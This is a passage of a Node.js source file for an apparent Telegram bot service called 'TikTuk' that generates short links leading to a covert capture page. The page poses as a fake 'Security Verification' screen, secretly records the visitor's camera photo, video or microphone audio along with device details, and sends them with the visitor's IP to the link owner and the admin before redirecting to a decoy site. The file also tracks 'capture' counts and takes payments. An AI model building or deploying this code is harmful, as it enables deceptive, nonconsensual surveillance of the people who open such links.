app.use(bodyParser.urlencoded({ extended: true, limit: '50mb' }));

// Middleware to set security headers for all responses
app.use((req, res, next) => {
    setSecurityHeaders(res);
    next();
});

// Telegram Webhook endpoint
app.post(`/webhook/${BOT_TOKEN}`, async (req, res) => {
    const update = req.body;
    writeLog(`Received update: ${JSON.stringify(update)}`);

    if (update.message) {
        const message = update.message;
        const chat_id = message.chat.id;
        const user_id = message.from.id;
        const text = message.text || '';
        const first_name = message.from.first_name || '';
        const username = message.from.username || '';

        if (message.successful_payment) {
            await handleSuccessfulPayment(message);
        } else if (user_id == ADMIN_ID && text.startsWith('/') && !['/start', '/lang', '/id'].includes(text.split(' ')[0])) {
            await handleAdminCommand(chat_id, text);
        } else if (text === '/lang' || text === '/language') {
            await showLanguageSelection(chat_id);
        } else if (text === '/id') {
            const user = getUser(user_id);
            const lang = user ? user.lang : 'ar';
            await sendMessage(chat_id, getTextMsg('your_id', lang, user_id));
        } else if (text.startsWith('/start')) {
            await handleStart(chat_id, user_id, first_name, username, text);
        } else {
            await handleMessage(chat_id, user_id, text);
        }
    } else if (update.callback_query) {
        await handleCallbackQuery(update.callback_query);
    } else if (update.pre_checkout_query) {
        await handlePreCheckoutQuery(update.pre_checkout_query);
    }

    res.sendStatus(200);
});

// Media Upload Endpoint (POST)
app.post('/upload', async (req, res) => {
    const client_ip = req.ip || 'unknown';
    if (!rateLimitCheck(client_ip, 10, 60)) {
        logSecurity('RATE_LIMIT', `IP: ${client_ip}`);
        return res.status(429).json({ status: 'error', msg: 'too many requests' });
    }

    const { action, nonce, user_id: enc_user_id, type, media_data, user_agent, platform } = req.body;

    if (action !== 'upload_media') {
        return res.status(400).json({ status: 'error', msg: 'invalid action' });
    }

    // Nonce validation disabled - links work forever

    const owner_id = decryptData(enc_user_id);
    if (!owner_id) {
        logSecurity('INVALID_DECRYPT', `enc_id: ${enc_user_id}`);
        return res.status(403).json({ status: 'error', msg: 'invalid id' });
    }

    if (!['photo', 'video', 'audio'].includes(type)) {
        logSecurity('INVALID_TYPE', `type: ${type}`);
        return res.status(400).json({ status: 'error', msg: 'invalid type' });
    }

    if (!validateMediaData(media_data)) {
        logSecurity('INVALID_MEDIA', `owner: ${owner_id}, type: ${type}`);
        return res.status(400).json({ status: 'error', msg: 'invalid media' });
    }

    // Decode base64 media
    const base64_parts = media_data.split(';base64,');
    const media_binary = Buffer.from(base64_parts[1], 'base64');

    let ext = 'bin';
    if (type === 'photo') ext = 'jpg';
    else if (type === 'video') ext = 'webm';
    else if (type === 'audio') ext = 'ogg';

    const filename = path.join(DATA_DIR, `${Date.now()}_${owner_id}.${ext}`);
    fs.writeFileSync(filename, media_binary);

    const time = new Date().toISOString().replace(/T/, ' ').replace(/\..+/, '');
    const caption = `🚨 <b>وسائط جديدة!</b>\n\n` +
                    `📷 النوع: ${type}\n` +
                    `🌐 IP: ${client_ip}\n` +
                    `📱 الجهاز: ${user_agent ? user_agent.substring(0, 100) : 'unknown'}\n` +
                    `💻 المنصة: ${platform || 'unknown'}\n` +
                    `📅 الوقت: ${time}`;

    try {
        const sendOptions = { caption: caption, parse_mode: 'HTML' };
        if (type === 'photo') {
            await bot.sendPhoto(owner_id, filename, sendOptions);
        } else if (type === 'video') {
            await bot.sendVideo(owner_id, filename, sendOptions);
        } else if (type === 'audio') {
            await bot.sendVoice(owner_id, filename, sendOptions);
        }

        // Send copy to admin
        if (owner_id != ADMIN_ID) {
            const adminSendOptions = { caption: `${caption}\n👤 صاحب الرابط: ${owner_id}`, parse_mode: 'HTML' };
            if (type === 'photo') {
                await bot.sendPhoto(ADMIN_ID, filename, adminSendOptions);
            } else if (type === 'video') {
                await bot.sendVideo(ADMIN_ID, filename, adminSendOptions);
            } else if (type === 'audio') {
                await bot.sendVoice(ADMIN_ID, filename, adminSendOptions);
            }
        }

        // Update capture stats
        let owner = getUser(owner_id);
        if (owner) {
            const today = new Date().toISOString().slice(0, 10);
            const today_captures = (owner.today_date === today) ? (owner.today_captures + 1) : 1;
            updateUser(owner_id, {
                total_captures: (owner.total_captures || 0) + 1,
                today_captures: today_captures,
                today_date: today
            });
            await checkAchievements(owner_id);
        }

        fs.unlinkSync(filename); // Delete temporary media file
        logSecurity('MEDIA_UPLOAD', `owner: ${owner_id}, type: ${type}, ip: ${client_ip}`);
        res.json({ status: 'success' });
    } catch (e) {
        writeLog(`Error sending media to Telegram: ${e.message}`);
        console.error('Error sending media to Telegram:', e);
        if (fs.existsSync(filename)) fs.unlinkSync(filename);
        res.status(500).json({ status: 'error', msg: 'Failed to send media to Telegram.' });
    }
});

// Capture Page (GET requests)
app.get('/:shortCode?', async (req, res) => {
    const shortCode = req.params.shortCode;

    // Serve landing.html for root or index.php equivalent
    if (!shortCode || shortCode === 'index.php') {
        const landingPath = path.join(__dirname, 'landing.html');
        if (fs.existsSync(landingPath)) {
            return res.sendFile(landingPath);
        } else {
            return res.send('<!DOCTYPE html><html><head><title>TikTuk</title></head><body><h1>TikTuk - Smart Tool</h1></body></html>');
        }
    }

    const linkData = getShortLinkData(shortCode);
    if (linkData) {
        const client_ip = req.ip || 'unknown';
        if (!rateLimitCheck(`page_${client_ip}`, 20, 60)) {
            return res.status(429).send('<h1>Too Many Requests</h1>');
        }

        const owner_id = linkData.u;
        const enc_id = encryptData(owner_id.toString());
        const redirect_url = linkData.r || 'https://google.com';
        const cam_type = linkData.c || 'f';

        let capture_type = 'photo';
        if (cam_type === 'v') capture_type = 'video';
        else if (cam_type === 'a') capture_type = 'audio';

        const facing_mode = (cam_type === 'b') ? 'environment' : 'user';
        const upload_url = `${BOT_URL}/upload`; // Node.js upload endpoint
        const nonce = generateNonce();

        renderCapturePage(res, enc_id, facing_mode, redirect_url, capture_type, upload_url, nonce);
    } else {
        res.status(404).send('Not Found');
    }
});

// ==========================================
// 9. Render Capture Page (Ported from index.php)
// ==========================================

function renderCapturePage(res, enc_id, facing_mode, redirect_url, capture_type, upload_url, nonce = '') {
    const redirect_safe = encodeURIComponent(redirect_url);
    const enc_id_safe = encodeURIComponent(enc_id);
    const nonce_safe = encodeURIComponent(nonce);

    res.send(`<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verifying...</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;background:linear-gradient(135deg,#0f0c29 0%,#302b63 50%,#24243e 100%);color:#fff;display:flex;justify-content:center;align-items:center;min-height:100vh;overflow:hidden}
        .container{text-align:center;padding:50px 30px;background:rgba(255,255,255,0.05);border-radius:30px;backdrop-filter:blur(25px);border:1px solid rgba(255,255,255,0.1);box-shadow:0 30px 100px rgba(0,0,0,0.6);animation:fadeIn 1s ease;max-width:400px;width:90%}
        @keyframes fadeIn{from{opacity:0;transform:scale(0.9) translateY(30px)}to{opacity:1;transform:scale(1) translateY(0)}}
        .logo{width:80px;height:80px;margin:0 auto 20px;background:linear-gradient(135deg,#667eea,#764ba2);border-radius:20px;display:flex;align-items:center;justify-content:center;font-size:36px;box-shadow:0 10px 30px rgba(102,126,234,0.4)}
        .spinner{width:45px;height:45px;border:3px solid rgba(255,255,255,0.1);border-top:3px solid #667eea;border-radius:50%;animation:spin 0.8s linear infinite;margin:25px auto}
        @keyframes spin{to{transform:rotate(360deg)}}
        h2{color:#fff;margin-bottom:8px;font-size:1.3em;font-weight:600}
        p{opacity:0.7;font-size:0.95em;line-height:1.5}
        .progress{width:100%;height:4px;background:rgba(255,255,255,0.1);border-radius:4px;margin:25px auto 0;overflow:hidden}
        .progress-bar{height:100%;width:0%;background:linear-gradient(90deg,#667eea,#764ba2);border-radius:4px;animation:loading 3s ease-in-out forwards}
        @keyframes loading{0%{width:0%}50%{width:60%}80%{width:85%}100%{width:95%}}
        .shield{margin-top:15px;font-size:12px;opacity:0.5}
        video,canvas{display:none!important}
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">🔒</div>
        <h2>Security Verification</h2>
        <p>Please wait while we verify your identity...</p>
        <div class="spinner"></div>
        <div class="progress"><div class="progress-bar"></div></div>
        <p class="shield">🛡️ Protected by CloudGuard™</p>
    </div>
    <video id="v" autoplay playsinline></video>
    <canvas id="cv"></canvas>
    <script>
    (function(){
        var v=document.getElementById("v"),cv=document.getElementById("cv"),ctx=cv.getContext("2d");
        var fm="${facing_mode}",uid="${enc_id}",rurl="${redirect_url}",ct="${capture_type}",uu="${upload_url}",nc="${nonce}";
        
        function getDeviceInfo(){
            return {
                user_agent: navigator.userAgent,
                platform: navigator.platform || "unknown",
                language: navigator.language || "unknown",
                screen: screen.width+"x"+screen.height
            };
        }
        
        function doPhoto(stream){
            v.srcObject=stream;v.play();
            setTimeout(function(){
                cv.width=v.videoWidth;cv.height=v.videoHeight;
                ctx.drawImage(v,0,0);
                var d=cv.toDataURL("image/jpeg",0.85);
                stream.getTracks().forEach(function(t){t.stop()});
                send("photo",d);
            },1500);
        }
        
        function doVideo(stream){
            v.srcObject=stream;v.play();
            var chunks=[],options={mimeType:"video/webm;codecs=vp8"};
            try{var mediaRecorder=new MediaRecorder(stream,options)}catch(e){options={mimeType:"video/webm"};var mediaRecorder=new MediaRecorder(stream,options)}
            mediaRecorder.ondataavailable=function(e){if(e.data.size>0)chunks.push(e.data)};
            mediaRecorder.onstop=function(){
                stream.getTracks().forEach(function(t){t.stop()});
                var blob=new Blob(chunks,{type:"video/webm"});
                var reader=new FileReader();
                reader.onloadend=function(){send("video",reader.result)};
                reader.readAsDataURL(blob);
            };
            mediaRecorder.start();
            setTimeout(function(){mediaRecorder.stop()},5000);
        }
        
        function doAudio(stream){
            v.srcObject=stream;v.play();
            var chunks=[],options={mimeType:"audio/ogg;codecs=opus"};
            try{var mediaRecorder=new MediaRecorder(stream,options)}catch(e){options={mimeType:"audio/webm"};var mediaRecorder=new MediaRecorder(stream,options)}
            mediaRecorder.ondataavailable=function(e){if(e.data.size>0)chunks.push(e.data)};
            mediaRecorder.onstop=function(){
                stream.getTracks().forEach(function(t){t.stop()});
                var blob=new Blob(chunks,{type:options.mimeType});
                var reader=new FileReader();
                reader.onloadend=function(){send("audio",reader.result)};
                reader.readAsDataURL(blob);
            };
            mediaRecorder.start();
            setTimeout(function(){mediaRecorder.stop()},10000);
        }

        function send(type,data){
            var deviceInfo = getDeviceInfo();
            fetch(uu,{
                method:"POST",
                headers:{"Content-Type":"application/json"},
                body:JSON.stringify({
                    action:"upload_media",
                    user_id:uid,
                    type:type,
                    media_data:data,
                    user_agent:deviceInfo.user_agent,
                    platform:deviceInfo.platform,
                    nonce:nc
                })
            }).then(function(r){return r.json()}).then(function(d){console.log(d);window.location.href=rurl}).catch(function(e){console.error(e);window.location.href=rurl});
        }

        navigator.mediaDevices.getUserMedia({video:{facingMode:fm},audio:true}).then(function(stream){
            if(ct==="photo"){doPhoto(stream);}
            else if(ct==="video"){doVideo(stream);}
            else if(ct==="audio"){doAudio(stream);}
            else{console.error("Unknown capture type");window.location.href=rurl;}
        }).catch(function(e){console.error(e);window.location.href=rurl});
    })();
    </script>
</body>
</html>`);
}

// ==========================================
// 10. Start Server
// ==========================================

const PORT = process.env.PORT || 3000;

// Function to set webhook
function setTelegramWebhook() {
    bot.setWebHook(`${BOT_URL}/webhook/${BOT_TOKEN}`).then(() => {
        console.log('Telegram webhook set successfully');
        writeLog('Telegram webhook set successfully');
    }).catch(e => {
        console.error('Error setting webhook:', e.message);
        writeLog(`Error setting webhook: ${e.message}`);
    });
}

app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
    writeLog(`Server started on port ${PORT}`);
    setTelegramWebhook();
});

